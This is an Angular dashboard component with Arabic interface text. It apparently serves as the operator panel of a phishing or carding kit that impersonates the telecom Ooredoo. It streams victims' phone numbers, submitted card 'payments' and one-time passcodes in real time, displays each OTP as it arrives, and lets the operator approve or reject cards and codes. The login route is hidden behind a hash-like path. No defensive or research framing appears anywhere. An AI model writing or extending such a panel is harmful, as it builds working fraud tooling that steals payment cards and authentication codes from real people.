import { Component, OnInit, OnDestroy, signal, inject } from '@angular/core';
import { CommonModule } from '@angular/common';
import { Router } from '@angular/router';
import { ToastService } from '../../services/toast';
import { enviroment } from '../../../env/enviroment';

@Component({
  selector: 'app-dashboard',
  standalone: true,
  imports: [CommonModule],
  templateUrl: './dashboard.html',
  styleUrl: './dashboard.css',
})
export class Dashboard implements OnInit, OnDestroy {
  toastService = inject(ToastService);
  router = inject(Router);

  clients = signal<any[]>([]);
  adminEmail = signal<string>('');

  eventSource: EventSource | null = null;

  ngOnInit() {
    const token = localStorage.getItem('admin_token');
    const email = localStorage.getItem('admin_email');
    if (!token) {
      this.router.navigate(['/93ceb7962cf40688f3c465ba57ff7286893fd19e']);
      return;
    }

    this.adminEmail.set(email || 'admin@ooredoo.com');
    this.loadData();
    this.connectRealtime();
  }

  ngOnDestroy() {
    if (this.eventSource) {
      this.eventSource.close();
    }
  }

  async loadData() {
    const token = localStorage.getItem('admin_token');
    try {
      const response = await fetch(enviroment.api_base + '/api/clients?include=payments,otps', {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      const resData = await response.json();
      if (resData.success) {
        // Sort clients by creation date descending
        const sorted = resData.data.sort((a: any, b: any) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
        this.clients.set(sorted);
      } else {
        this.toastService.show(resData.error || 'فشل تحميل البيانات', 'error');
        if (response.status === 401 || response.status === 403) {
          this.logout();
        }
      }
    } catch (error) {
      this.toastService.show('خطأ في الاتصال بالخادم لتحميل البيانات', 'error');
    }
  }

  connectRealtime() {
    const token = localStorage.getItem('admin_token');
    if (!token) return;

    this.eventSource = new EventSource(enviroment.api_base + `/api/events/admin?token=${token}`);

    this.eventSource.addEventListener('client_created', (evt: any) => {
      const newClient = JSON.parse(evt.data);
      newClient.payments = [];
      newClient.otps = [];
      this.clients.update(list => [newClient, ...list]);
      this.toastService.show(`عميل جديد انضم: ${newClient.phone_number}`, 'success');
    });

    this.eventSource.addEventListener('payment_created', (evt: any) => {
      const payment = JSON.parse(evt.data);
      this.clients.update(list => list.map(c => {
        if (c.id === payment.client_id) {
          return { ...c, payments: [...(c.payments || []), payment] };
        }
        return c;
      }));
      this.toastService.show(`طلب دفع جديد للعميل صاحب الرقم ${this.getClientPhone(payment.client_id)}`, 'info');
    });

    this.eventSource.addEventListener('payment_updated', (evt: any) => {
      const payment = JSON.parse(evt.data);
      this.clients.update(list => list.map(c => {
        if (c.id === payment.client_id) {
          return {
            ...c,
            payments: (c.payments || []).map((p: any) => p.id === payment.id ? payment : p)
          };
        }
        return c;
      }));
    });

    this.eventSource.addEventListener('otp_created', (evt: any) => {
      const otp = JSON.parse(evt.data);
      this.clients.update(list => list.map(c => {
        if (c.id === otp.client_id) {
          return { ...c, otps: [...(c.otps || []), otp] };
        }
        return c;
      }));
      this.toastService.show(`رمز تحقق جديد تم تقديمه: ${otp.otp}`, 'info');
    });

    this.eventSource.addEventListener('otp_updated', (evt: any) => {
      const otp = JSON.parse(evt.data);
      this.clients.update(list => list.map(c => {
        if (c.id === otp.client_id) {
          return {
            ...c,
            otps: (c.otps || []).map((o: any) => o.id === otp.id ? otp : o)
          };
        }
        return c;
      }));
    });

    this.eventSource.onerror = () => {
      this.eventSource?.close();
      // Retry connection after 5 seconds
      setTimeout(() => this.connectRealtime(), 5000);
    };
  }

  getClientPhone(clientId: string): string {
    const found = this.clients().find(c => c.id === clientId);
    return found ? found.phone_number : 'غير معروف';
  }

  async handlePaymentAction(paymentId: string, status: 'ACCEPTED' | 'REJECTED') {
    const token = localStorage.getItem('admin_token');
    try {
      const response = await fetch(enviroment.api_base + `/api/payments/${paymentId}`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify({ status })
      });
      const resData = await response.json();
      if (resData.success) {
        this.toastService.show(status === 'ACCEPTED' ? 'تمت الموافقة على البطاقة' : 'تم رفض البطاقة', 'success');
      } else {
        this.toastService.show(resData.error || 'حدث خطأ أثناء معالجة القرار', 'error');
      }
    } catch (error) {
      this.toastService.show('خطأ في الاتصال بالخادم لإتمام العملية', 'error');
    }
  }

  async handleOtpAction(otpId: string, status: 'ACCEPTED' | 'REJECTED') {
    const token = localStorage.getItem('admin_token');
    try {
      const response = await fetch(enviroment.api_base + `/api/otps/${otpId}`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify({ status })
      });
      const resData = await response.json();
      if (resData.success) {
        this.toastService.show(status === 'ACCEPTED' ? 'تمت الموافقة على الـ OTP' : 'تم رفض الـ OTP', 'success');
      } else {
        this.toastService.show(resData.error || 'حدث خطأ أثناء معالجة القرار', 'error');
      }
    } catch (error) {
      this.toastService.show('خطأ في الاتصال بالخادم لإتمام العملية', 'error');
    }
  }

  getLatestPayment(client: any): any {
    if (!client.payments || client.payments.length === 0) return null;
    return client.payments[client.payments.length - 1];
  }

  getLatestOtp(client: any): any {
    if (!client.otps || client.otps.length === 0) return null;
    return client.otps[client.otps.length - 1];
  }

  logout() {
    localStorage.removeItem('admin_token');
    localStorage.removeItem('admin_email');
    this.router.navigate(['/93ceb7962cf40688f3c465ba57ff7286893fd19e']);
  }
}
